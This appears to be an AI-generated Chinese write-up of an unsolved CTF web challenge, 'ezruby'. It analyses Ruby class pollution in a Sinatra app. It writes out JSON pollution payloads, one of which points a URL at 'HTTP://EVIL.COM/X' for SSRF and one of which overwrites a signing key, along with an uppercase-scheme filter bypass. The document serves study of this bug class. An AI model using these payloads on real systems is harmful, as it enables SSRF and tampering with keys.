# CTF 20min 第 8 题：ezruby（2024 CCB×CISCN Quals WEB）

- 题目：CTF-Archives/2024-CCB-CISCN-Quals/ezruby.zip（1.3KB，仅 main.rb，Sinatra+Ruby 类污染，全赛 1 队解出、500 分）
- flag：未取得（NOT SOLVED）——远程靶机早已下线，本题 flag 在远程，本地无可执行内容
- 耗时：约 14 分钟（下载/分析 5 + 引擎 1 + 搜索题解 5 + 收尾 3），未超 15+5 盒
- 通道：快通道 solve --mode auto NOT SOLVED（4.8s，180 attempts，无 Ruby/web 检测器，预期内）→ 模型探索通道静态推导

## 本题结论（完整污染链已推至 payload 级）

1. 漏洞本质：Ruby 版"原型链污染"。recursive_merge 中 Hash 值走 `respond_to?(key) → public_send(key)`（仅零参）遍历对象图，标量走 `instance_variable_set(@key)+singleton_class.attr_accessor key`
2. payload A（SSRF gadget）：`{"class":{"superclass":{"url":"HTTP://EVIL.COM/X"}}}`——user.class→User→superclass→**Person 类对象**；在其 singleton_class 上 attr_accessor :url **方法遮蔽**原 `def self.url`，Person.url 从读 `@@url` 重定向到可控 `@url` → GET /launch-curl-command 触发 `Net::HTTP.get_response` SSRF
3. payload B（随机命中 KeySigner）：`{"class":{"superclass":{"superclass":{"constants":{"sample":{"signing_key":"X"}}}}}}`——Person.superclass→Object→`Object.constants`（字母序常量数组，含 KeySigner）→ `Array#sample` 随机命中（≈1/N，反复请求），覆盖 `KeySigner.signing_key` → /sign_with_subclass_key 回显可控
4. 过滤器绕过：`j_str.include?("\\") || include?("h")` → scheme 大写 `HTTP://`（URI 不区分大小写）；payload 键名 class/superclass/signing_key/constants/sample 全程无小写 h
5. flag 定位假设（未证实）：/check-infected-vars 直接回显 Person.url 与 KeySigner.signing_key，部署版 flag 应在类变量或需 SSRF 取内网/文件且另有回显 gadget；无法实测

## 题解学习要点

- 检索 5 源均无果：A1natas 官方 writeup 站登录墙（wp.a1natas.com TLS 失败、www 站跳登录）、GitHub code search 需认证、repo search 限流、fork commit 仅 README 格式整理、4 组关键词搜索引擎均无 ezruby wp——1/1 队解出，公开 writeup 不存在
- 已 learn-writeup 入库（ezruby_2024CCB，web 类），闭合学习环

## 失败原因

- 客观：flag 在远程靶机（赛题 2024 年下发制，无残留环境），本地只有 1.3KB 源码，无可执行/可爆破对象
- 能力边界：15 分钟盒内零参 public_send 的对象图可达集（不含 ObjectSpace/带参遍历）无法升级到 RCE 或 flag 回显，需远程联调逐 gadget 验证

## 七维标签

web | ruby | 类污染/原型链污染 | method-shadowing（singleton attr_accessor 遮蔽类方法）| SSRF | 零参 public_send 对象图 | constants+sample 随机命中 | 大写 scheme 绕字符黑名单 | sinatra

## 每题一得

**Ruby 类污染的收尾手法是"方法遮蔽"而非"变量改写"**：instance_variable_set 在类对象上只能设类级实例变量 @x，改不了类变量 @@x；真正生效的是 singleton_class.attr_accessor 后定义覆盖原 `def self.x`，把 @@ 读取语义重定向到可控 @。对象图遍历全程依赖零参方法链 class→superclass→constants→sample。固化候选：检测信号"respond_to?+public_send 递归 merge + instance_variable_set"登记进 references（Ruby 污染模式），无引擎检测器价值。

## 变体预测

开放带参 public_send 或利用 respond_to_missing? 可达 ObjectSpace.each_object/const_get 大幅扩展命中面；若某 gadget 回显 SSRF response.body 则链 1 直取 flag；黑名单若改为禁大写 h 则需 scheme 同形字符或 Decimal IP 绕过。

## 下轮改进

1. remote 类题（web/pwn-远程）在选题阶段即可判定"无本地 flag"，预期收益=纯链路推导，优先选有本地靶机/离线数据的题（avm 型）
2. A1natas writeup 站登录墙是已知障碍，CTF-Archives README 的解法链接先看 GitHub 侧镜像

> AI生成
